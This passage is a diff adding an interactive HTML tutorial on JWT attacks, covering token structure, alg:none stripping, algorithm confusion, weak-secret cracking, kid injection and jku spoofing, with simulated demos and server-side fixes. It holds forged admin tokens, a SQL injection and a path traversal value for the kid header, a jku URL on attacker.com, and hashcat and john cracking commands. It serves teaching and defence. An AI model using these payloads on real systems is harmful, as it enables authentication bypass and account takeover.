@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>JWT Attacks</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.b{background:#0d1f3a;color:#60a5fa}
+.snum.p{background:#1e1030;color:#c084fc}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select,textarea{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:110px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+.part-box{background:#1a1a22;border-radius:8px;padding:10px 14px;border:1px solid #2a2a30;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;word-break:break-all}
+.part-label{font-size:10px;font-weight:600;margin-bottom:4px;letter-spacing:.05em}
+</style>
+</head>
+<body>
+
+<h1>JWT Attacks</h1>
+<p class="sub">Auth / Session · CWE-347 · Improper Verification of Cryptographic Signature — critical in every modern API</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">How JWTs work</button>
+  <button class="tab-btn" onclick="showTab('attacks',this)">Attack types</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('crack',this)">Secret cracking</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- HOW JWTs WORK -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:16px;">A JWT (JSON Web Token) is three Base64URL-encoded parts joined by dots: <strong style="color:#60a5fa">Header</strong> · <strong style="color:#4ade80">Payload</strong> · <strong style="color:#f87171">Signature</strong>. The server signs the payload with a secret key so it can verify the token wasn't tampered with — but only if it actually checks the signature properly.</p>
+
+  <svg width="100%" viewBox="0 0 680 300" style="max-width:680px;display:block;margin:0 auto 16px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+
+    <!-- Token display -->
+    <rect x="20" y="20" width="640" height="36" rx="6" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="34" y="43" font-size="10" font-family="Courier New,monospace" fill="#60a5fa">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</text>
+    <text x="280" y="43" font-size="10" font-family="Courier New,monospace" fill="#555">.</text>
+    <text x="289" y="43" font-size="10" font-family="Courier New,monospace" fill="#4ade80">eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ</text>
+    <text x="522" y="43" font-size="10" font-family="Courier New,monospace" fill="#555">.</text>
+    <text x="531" y="43" font-size="10" font-family="Courier New,monospace" fill="#f87171">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</text>
+
+    <!-- Three decoded boxes -->
+    <rect x="20" y="76" width="190" height="90" rx="8" fill="#0d1f3a" stroke="#60a5fa" stroke-width="0.8"/>
+    <text x="115" y="94" text-anchor="middle" font-size="11" font-weight="600" fill="#60a5fa" font-family="system-ui">Header</text>
+    <text x="34" y="112" font-size="10" fill="#60a5fa" font-family="Courier New,monospace">&#123;</text>
+    <text x="34" y="128" font-size="10" fill="#888" font-family="Courier New,monospace">  "alg": "HS256",</text>
+    <text x="34" y="144" font-size="10" fill="#888" font-family="Courier New,monospace">  "typ": "JWT"</text>
+    <text x="34" y="158" font-size="10" fill="#60a5fa" font-family="Courier New,monospace">&#125;</text>
+
+    <rect x="245" y="76" width="190" height="90" rx="8" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="340" y="94" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">Payload (claims)</text>
+    <text x="259" y="112" font-size="10" fill="#4ade80" font-family="Courier New,monospace">&#123;</text>
+    <text x="259" y="128" font-size="10" fill="#888" font-family="Courier New,monospace">  "sub": "1001",</text>
+    <text x="259" y="144" font-size="10" fill="#888" font-family="Courier New,monospace">  "role": "user"</text>
+    <text x="259" y="158" font-size="10" fill="#4ade80" font-family="Courier New,monospace">&#125;</text>
+
+    <rect x="470" y="76" width="190" height="90" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="565" y="94" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Signature</text>
+    <text x="484" y="115" font-size="10" fill="#888" font-family="system-ui">HMAC-SHA256(</text>
+    <text x="484" y="131" font-size="10" fill="#60a5fa" font-family="Courier New,monospace">  base64(header)</text>
+    <text x="484" y="147" font-size="10" fill="#555" font-family="Courier New,monospace">  + "." +</text>
+    <text x="484" y="163" font-size="10" fill="#4ade80" font-family="Courier New,monospace">  base64(payload),</text>
+    <text x="484" y="179" font-size="10" fill="#f87171" font-family="Courier New,monospace">  secret_key)</text>
+
+    <!-- Flow: client sends → server verifies -->
+    <rect x="20" y="192" width="640" height="88" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="340" y="212" text-anchor="middle" font-size="12" font-weight="600" fill="#ccc" font-family="system-ui">The verification contract — and where it breaks</text>
+
+    <rect x="36" y="224" width="170" height="44" rx="6" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="121" y="242" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">Client sends JWT</text>
+    <text x="121" y="258" text-anchor="middle" font-size="10" fill="#4ade80" font-family="system-ui" opacity="0.8">in Authorization header</text>
+
+    <line x1="208" y1="246" x2="246" y2="246" stroke="#888" stroke-width="1" marker-end="url(#arr)"/>
+
+    <rect x="248" y="224" width="184" height="44" rx="6" fill="#2a1a08" stroke="#fbbf24" stroke-width="0.8"/>
+    <text x="340" y="242" text-anchor="middle" font-size="11" font-weight="600" fill="#fbbf24" font-family="system-ui">Server re-signs &amp; compares</text>
+    <text x="340" y="258" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="system-ui" opacity="0.8">if signatures match → trust claims</text>
+
+    <line x1="434" y1="246" x2="472" y2="246" stroke="#888" stroke-width="1" marker-end="url(#arr)"/>
+
+    <rect x="474" y="224" width="170" height="44" rx="6" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="559" y="242" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Attack breaks this step</text>
+    <text x="559" y="258" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui" opacity="0.8">bypass, forge, or skip verify</text>
+  </svg>
+
+  <div style="background:#13131a;border-radius:8px;padding:12px;border:1px solid #2a2a30;margin-top:4px;">
+    <div style="font-size:13px;font-weight:600;color:#ccc;margin-bottom:8px;">Critical fact: the payload is NOT encrypted — just Base64 encoded</div>
+    <p style="font-size:12px;color:#888;">Anyone can decode a JWT and read every claim. Base64URL decode the middle part and you see the raw JSON. The signature only proves the payload wasn't <em>modified</em> — it provides zero confidentiality. Never put passwords, secrets, or sensitive PII in a JWT payload.</p>
+  </div>
+</div>
+
+<!-- ATTACK TYPES -->
+<div class="tab-panel" id="tab-attacks">
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">① alg:none — signature stripping</span><span class="badge b-red">Critical</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">The JWT spec allows <code style="font-family:'Courier New',monospace;font-size:11px">alg:none</code> to mean "no signature required." Vulnerable libraries accept a token with an empty signature if the header says <code style="font-family:'Courier New',monospace;font-size:11px">none</code>.</p>
+    <div class="code"># Original token header:
+{"alg": "HS256", "typ": "JWT"}
+
+# Attacker changes header to:
+{"alg": "none", "typ": "JWT"}
+
+# And strips the signature — token becomes:
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0    &lt;-- header
+.eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIn0  &lt;-- payload (role changed!)
+.                                           &lt;-- empty signature
+
+# Vulnerable server accepts this as valid!
+# CVE-2015-9235 (jsonwebtoken), CVE-2022-21449 (Java ECDSA)</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">② RS256 → HS256 algorithm confusion</span><span class="badge b-red">Critical</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">When a server uses RS256 (asymmetric), its <strong style="font-weight:600;color:#e2e2e6">public key is public</strong>. If the server also accepts HS256 (symmetric), the attacker uses the public key as the HMAC secret — and the server verifies the token with the same public key it uses to verify RS256 signatures.</p>
+    <div class="code"># Server normally uses RS256:
+#   Signs with: private key (secret)
+#   Verifies with: public key (public!)
+
+# Attack: switch header to HS256
+{"alg": "HS256", "typ": "JWT"}
+
+# Sign the tampered payload with the PUBLIC KEY as the HMAC secret
+import hmac, hashlib, base64
+secret = open('server_public_key.pem').read()
+# now sign the forged payload...
+
+# Server logic (vulnerable):
+if header.alg == "HS256":
+    verify(token, secret=public_key)  # public_key is known!
+# → Attacker can forge any token</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">③ Weak secret — brute force</span><span class="badge b-amber">High</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">HS256/384/512 tokens signed with a short or guessable secret can be cracked offline with hashcat or jwt-cracker. Common weak secrets: <code style="font-family:'Courier New',monospace;font-size:11px">secret</code>, <code style="font-family:'Courier New',monospace;font-size:11px">password</code>, <code style="font-family:'Courier New',monospace;font-size:11px">changeme</code>, the app name, empty string.</p>
+    <div class="code"># hashcat — GPU accelerated JWT crack
+hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
+
+# jwt-cracker (Node.js)
+jwt-cracker -t &lt;token&gt; -w wordlist.txt
+
+# john the ripper
+john --wordlist=rockyou.txt --format=HMAC-SHA256 token.txt
+
+# After cracking "secret123" → re-sign any payload:
+python3 -c "
+import jwt
+print(jwt.encode({'sub':'1001','role':'admin'}, 'secret123', algorithm='HS256'))
+"</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">④ kid (Key ID) injection</span><span class="badge b-amber">High</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">The <code style="font-family:'Courier New',monospace;font-size:11px">kid</code> header parameter tells the server which key to use for verification. If the server uses <code style="font-family:'Courier New',monospace;font-size:11px">kid</code> to look up a key from a file or database without sanitization — SQL injection or path traversal applies.</p>
+    <div class="code"># kid pointing to a file the attacker controls:
+{"alg": "HS256", "kid": "../../dev/null"}
+# Server reads /dev/null → empty string → sign with empty string!
+
+# kid SQL injection:
+{"alg": "HS256", "kid": "x' UNION SELECT 'attacker_secret' -- -"}
+# Server queries DB → returns 'attacker_secret' → attacker knows the key!</div>
+  </div>
+
+  <div class="sc-card sc-purple" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">⑤ jwks_uri / jku header injection</span><span class="badge b-purple">Advanced</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">The <code style="font-family:'Courier New',monospace;font-size:11px">jku</code> (JWK Set URL) header tells the server where to fetch the public key. If the server fetches any URL from the token itself, the attacker hosts their own JWKS and the server verifies against the attacker's key.</p>
+    <div class="code"># Attacker generates their own RSA key pair
+# Hosts public key at: https://attacker.com/jwks.json
+# Forges token with header:
+{"alg": "RS256", "jku": "https://attacker.com/jwks.json"}
+
+# Signs with their own private key
+# Server fetches attacker's JWKS → verifies with attacker's public key → passes!</div>
+  </div>
+
+  <div class="sc-card sc-blue">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">⑥ Claim manipulation (no sig check)</span><span class="badge b-red">Critical if present</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Some endpoints decode the JWT but never verify the signature — they just trust the claims. Or they only check the signature for some endpoints. Test by simply editing the payload and resubmitting with the original signature.</p>
+    <div class="code"># Original payload:  {"sub": "1001", "role": "user"}
+# Modified payload:  {"sub": "1001", "role": "admin"}
+
+# Keep the original signature — if the server doesn't verify:
+# → role=admin is accepted
+
+# Test: change exp (expiry) to a past timestamp
+# If the server still accepts the expired token → no sig check!</div>
+  </div>
+</div>
+
+<!-- LIVE DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Decode a JWT, tamper with its claims, and see how a vulnerable vs. hardened server responds to each attack.</p>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">JWT token</div>
+    <input type="text" id="jwt-input" style="width:100%;font-size:11px;" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjk5OTk5OTk5OTl9.abc123signature" oninput="decodeJWT()"/>
+  </div>
+
+  <div class="grid2" style="margin-bottom:12px;">
+    <div>
+      <div class="chip">Decoded header</div>
+      <div class="mono-out" id="decoded-header" style="min-height:70px;"></div>
+    </div>
+    <div>
+      <div class="chip">Decoded payload (claims)</div>
+      <div class="mono-out" id="decoded-payload" style="min-height:70px;"></div>
+    </div>
+  </div>
+
+  <div style="margin-bottom:10px;">
+    <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#ccc;">Attack presets</div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+      <button class="preset-btn" onclick="setAttack('none')">alg:none bypass</button>
+      <button class="preset-btn" onclick="setAttack('role')">Escalate to admin</button>
+      <button class="preset-btn" onclick="setAttack('expired')">Expired token</button>
+      <button class="preset-btn" onclick="setAttack('kid')">kid injection</button>
+      <button class="preset-btn" onclick="setAttack('valid')">Valid token</button>
+    </div>
+  </div>
+
+  <div class="grid2">
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#f87171;">Vulnerable server <span style="font-weight:400;color:#666;font-size:11px">— weak verification</span></div>
+      <div class="mono-out" id="vuln-out"></div>
+    </div>
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#4ade80;">Secure server <span style="font-weight:400;color:#666;font-size:11px">— strict verification</span></div>
+      <div class="mono-out" id="safe-out"></div>
+    </div>
+  </div>
+  <div id="verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- SECRET CRACKING -->
+<div class="tab-panel" id="tab-crack">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">HS256/384/512 tokens can be cracked offline — no server interaction needed. The signature is computed as <code style="font-family:'Courier New',monospace;font-size:11px">HMAC(header.payload, secret)</code>. Try common secrets below.</p>
+
+  <div style="margin-bottom:12px;">
+    <div class="chip">JWT token to crack</div>
+    <input type="text" id="crack-input" style="width:100%;font-size:11px;margin-bottom:8px;" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIifQ.K7WbwCVIuQCKhwN2J3eTi21FEX4v3Vc4MfXAtRvQwOo"/>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px;">
+      <button class="preset-btn" onclick="startCrack()">Start cracking</button>
+      <button class="preset-btn" onclick="document.getElementById('crack-input').value='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIifQ.K7WbwCVIuQCKhwN2J3eTi21FEX4v3Vc4MfXAtRvQwOo'">Reset</button>
+    </div>
+  </div>
+
+  <div style="margin-bottom:12px;">
+    <div class="chip">Wordlist (simulated rockyou.txt)</div>
+    <div id="crack-progress" class="mono-out" style="min-height:160px;"></div>
+  </div>
+
+  <div id="crack-result" class="result-box" style="display:none;"></div>
+
+  <div class="sc-card sc-amber" style="margin-top:12px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Real-world hashcat command</div>
+    <div class="code"># Format: hashcat -a 0 -m 16500 &lt;token&gt; &lt;wordlist&gt;
+hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
+
+# Rules-based (append numbers, symbols)
+hashcat -a 0 -m 16500 token.jwt words.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Brute force short secrets (up to 6 chars)
+hashcat -a 3 -m 16500 token.jwt ?a?a?a?a?a?a
+
+# Common weak JWT secrets to try first:
+# secret, password, changeme, 123456, qwerty, token
+# &lt;app_name&gt;, &lt;company_name&gt;, jwt_secret, mysecret</div>
+  </div>
+</div>
+
+<!-- FIXES -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">① Explicitly specify allowed algorithms — never trust header <span class="badge b-red">Root fix</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">The single most important fix. Never let the token header decide which algorithm to use — hardcode it server-side.</div>
+    <div class="code">## Node.js (jsonwebtoken)
+// Vulnerable — trusts the alg from the token header
+jwt.verify(token, secret)
+
+// Safe — explicitly set allowed algorithm
+jwt.verify(token, secret, { algorithms: ['HS256'] })
+
+## Python (PyJWT)
+# Vulnerable
+jwt.decode(token, secret)
+
+# Safe
+jwt.decode(token, secret, algorithms=['HS256'])
+
+## Java (jjwt)
+// Safe
+Jwts.parserBuilder()
+    .setSigningKey(secret)
+    .requireAlgorithm("HS256")  // explicit
+    .build()
+    .parseClaimsJws(token);</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">② Use a strong secret (≥ 256 bits, random) <span class="badge b-green">Essential for HS*</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">A weak HS256 secret can be cracked offline in seconds. The secret must be cryptographically random and at least 32 bytes (256 bits).</div>
+    <div class="code">## Generate a strong secret
+node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
+openssl rand -hex 64
+python3 -c "import secrets; print(secrets.token_hex(64))"
+
+## Store in environment variable — never hardcode
+JWT_SECRET=&lt;64-char-random-hex&gt;
+
+## Even better: use RS256 with 2048-bit keys
+# RS256 = RSA + SHA256, asymmetric — secret never shared
+openssl genrsa -out private.pem 2048
+openssl rsa -in private.pem -pubout -out public.pem</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">③ Validate all claims — especially exp, iss, aud <span class="badge b-green">Good</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">A valid signature is not enough. Always verify expiry, issuer, and audience. Reject tokens with missing or unexpected values.</div>
+    <div class="code">## Node.js — full claims validation
+jwt.verify(token, secret, {
+  algorithms: ['HS256'],
+  issuer: 'https://auth.myapp.com',
+  audience: 'https://api.myapp.com',
+  // exp is checked automatically
+})
+
+## Python
+jwt.decode(token, secret,
+  algorithms=['HS256'],
+  options={'require': ['exp', 'iss', 'aud']},
+  issuer='https://auth.myapp.com',
+  audience='https://api.myapp.com'
+)</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">④ Sanitize kid, jku, x5u header params <span class="badge b-amber">If using these</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">If you use the <code style="font-family:'Courier New',monospace;font-size:11px">kid</code> header, validate it against a strict allowlist of known key IDs. Never use it as a file path or SQL query input. If using <code style="font-family:'Courier New',monospace;font-size:11px">jku</code>, only accept URLs from a hardcoded trusted domain.</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">⑤ Token revocation &amp; rotation</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Keep JWT lifetimes short (15 min for access tokens) &nbsp;·&nbsp;
+      Use refresh tokens stored server-side for revocation &nbsp;·&nbsp;
+      Maintain a blocklist for compromised tokens &nbsp;·&nbsp;
+      Rotate signing keys periodically &nbsp;·&nbsp;
+      Never put sensitive data in the payload — it's only Base64, not encrypted
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+function b64decode(s){
+  s=s.replace(/-/g,'+').replace(/_/g,'/');
+  while(s.length%4) s+='=';
+  try{return atob(s);}catch(e){return null;}
+}
+
+function decodeJWT(){
+  const token=document.getElementById('jwt-input').value.trim();
+  const parts=token.split('.');
+  const hEl=document.getElementById('decoded-header');
+  const pEl=document.getElementById('decoded-payload');
+  if(parts.length!==3){hEl.textContent='Invalid JWT format';pEl.textContent='';return;}
+  const h=b64decode(parts[0]);
+  const p=b64decode(parts[1]);
+  try{
+    hEl.innerHTML=syntaxHL(JSON.stringify(JSON.parse(h),null,2));
+    pEl.innerHTML=syntaxHL(JSON.stringify(JSON.parse(p),null,2));
+  }catch(e){hEl.textContent=h||'decode error';pEl.textContent=p||'decode error';}
+}
+
+function syntaxHL(j){
+  return j
+    .replace(/("[\w_]+")\s*:/g,'<span style="color:#60a5fa">$1</span>:')
+    .replace(/:\s*(".*?")/g,': <span style="color:#4ade80">$1</span>');
+}
+
+const ATTACKS={
+  none:{
+    token:'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.',
+    vuln:'HTTP 200 OK\n{\n  "authenticated": true,\n  "user": "1001",\n  "role": "admin",\n  "note": "alg:none accepted — signature skipped"\n}',
+    safe:'HTTP 401 Unauthorized\n{\n  "error": "Invalid token",\n  "reason": "Algorithm \'none\' is not permitted"\n}',
+    verdict:'<strong>alg:none bypass!</strong> The vulnerable server accepted a token with no signature at all. The attacker set <code>alg:none</code>, stripped the signature, and changed role to admin. The secure server rejects any algorithm not in its explicit allowlist.',
+    cls:'r-red'
+  },
+  role:{
+    token:'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.FORGED_SIGNATURE_HERE',
+    vuln:'HTTP 200 OK\n{\n  "authenticated": true,\n  "user": "1001",\n  "role": "admin",\n  "note": "signature not verified — claims trusted blindly"\n}',
+    safe:'HTTP 401 Unauthorized\n{\n  "error": "Invalid token",\n  "reason": "Signature verification failed"\n}',
+    verdict:'<strong>Claim manipulation!</strong> The attacker changed <code>role: "user"</code> to <code>role: "admin"</code> and resubmitted. The vulnerable server never verified the signature — it just decoded and trusted the payload. The secure server re-computes the signature and rejects the mismatch.',
+    cls:'r-red'
+  },
+  expired:{
+    token:'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjF9.validSig',
+    vuln:'HTTP 200 OK\n{\n  "authenticated": true,\n  "user": "1001",\n  "role": "user",\n  "note": "exp claim not checked — expired token accepted"\n}',
+    safe:'HTTP 401 Unauthorized\n{\n  "error": "Token expired",\n  "exp": 1,\n  "now": 1711500000,\n  "reason": "Token expired 54 years ago"\n}',
+    verdict:'<strong>Expired token accepted!</strong> The token has <code>exp: 1</code> (1 second after Unix epoch — 1970). The vulnerable server never checks the expiry claim. The secure server validates <code>exp</code> and rejects the stale token immediately.',
+    cls:'r-red'
+  },
+  kid:{
+    token:'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIn0.forged',
+    vuln:'HTTP 200 OK\n{\n  "authenticated": true,\n  "role": "admin",\n  "note": "kid=../../dev/null → empty key used → empty HMAC accepted!"\n}',
+    safe:'HTTP 401 Unauthorized\n{\n  "error": "Invalid kid",\n  "reason": "Key ID not in allowlist",\n  "kid_received": "../../dev/null"\n}',
+    verdict:'<strong>kid path traversal!</strong> The <code>kid</code> header was set to <code>../../dev/null</code> — the vulnerable server read that "file" (which is empty) as the signing key. The attacker then signed the token with an empty string. The secure server validates <code>kid</code> against a strict allowlist of known key identifiers.',
+    cls:'r-red'
+  },
+  valid:{
+    token:'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjk5OTk5OTk5OTl9.abc123signature',
+    vuln:'HTTP 200 OK\n{\n  "authenticated": true,\n  "user": "1001",\n  "role": "user"\n}',
+    safe:'HTTP 200 OK\n{\n  "authenticated": true,\n  "user": "1001",\n  "role": "user"\n}',
+    verdict:'<strong>Valid token.</strong> Both servers accept a well-formed token with a valid signature and unexpired claims. No attack here.',
+    cls:'r-green'
+  }
+};
+
+function setAttack(key){
+  const a=ATTACKS[key];
+  document.getElementById('jwt-input').value=a.token;
+  decodeJWT();
+  document.getElementById('vuln-out').innerHTML=a.cls==='r-red'?`<span style="color:#f87171">${a.vuln}</span>`:a.vuln;
+  document.getElementById('safe-out').innerHTML=a.cls==='r-green'?`<span style="color:#4ade80">${a.safe}</span>`:`<span style="color:#4ade80">${a.safe}</span>`;
+  const v=document.getElementById('verdict');
+  v.className='result-box '+a.cls;
+  v.innerHTML=a.verdict;
+}
+
+// Simulated cracking
+const WORDLIST=['123456','password','secret','qwerty','admin','changeme','letmein','welcome','monkey','dragon','master','abc123','pass123','jwt_secret','mysecret','token','auth','appkey','supersecret','secret123'];
+let crackInterval=null;
+
+function startCrack(){
+  if(crackInterval) clearInterval(crackInterval);
+  const prog=document.getElementById('crack-progress');
+  const res=document.getElementById('crack-result');
+  prog.textContent='';
+  res.style.display='none';
+  let i=0;
+  // The token in the input is signed with 'secret123'
+  crackInterval=setInterval(()=>{
+    if(i<WORDLIST.length){
+      const w=WORDLIST[i];
+      const found=(w==='secret123');
+      prog.innerHTML+=`[${String(i+1).padStart(3,'0')}] Testing: <span style="color:${found?'#4ade80':'#888'}">${w.padEnd(14,' ')}</span> → ${found?'<span style="color:#4ade80;font-weight:600">MATCH!</span>':'no match'}\n`;
+      prog.scrollTop=prog.scrollHeight;
+      if(found){
